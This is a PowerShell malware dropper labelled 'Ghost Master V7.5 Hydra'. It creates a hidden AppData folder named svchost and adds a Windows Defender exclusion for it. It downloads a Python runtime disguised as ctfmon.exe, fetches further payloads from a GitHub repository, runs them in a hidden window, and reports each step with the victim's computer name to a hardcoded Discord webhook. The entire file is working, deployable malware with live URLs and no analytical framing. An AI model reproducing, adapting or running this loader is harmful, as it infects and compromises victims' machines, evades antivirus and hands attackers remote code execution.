# --- THE FINAL GHOST MASTER (V7.5 - ZERO-DEPENDENCY HYDRA) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

# Force TLS 1.2 for Discord and Python downloads
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"

# Prevent duplicate execution
if (Get-Process -Name "ctfmon" | Where-Object { $_.Path -like "*$Path*" }) { exit }

# Create work dir and set Defender exclusion
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 1. LANDING YOUR CUSTOM CORE (15MB)
if (!(Test-Path $PY_MASK)) {
    Send-Ghost "Landing Private Engine (Fast Stream)..."
    $zip = "$Path\py.zip"
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/py_core.zip" -OutFile $zip
    
    # Surgical Extraction (Uses native Shell.Application - much more stable than Expand-Archive)
    if (!(Test-Path "$Path\python")) { New-Item -ItemType Directory -Path "$Path\python" -Force }
    $shell = New-Object -ComObject Shell.Application
    $zipFile = $shell.NameSpace($zip)
    $dest = $shell.NameSpace("$Path\python")
    $dest.CopyHere($zipFile.Items(), 0x10) # 0x10 = Respond "Yes to All"
    
    Remove-Item $zip -ErrorAction SilentlyContinue
}

# 2. LANDING PAYLOADS
Send-Ghost "Syncing Ghost Logic..."
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\mui_cache.bin"

# 3. ENGAGE
Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden

Send-Ghost "Hydra Fully Online. Persistence established."
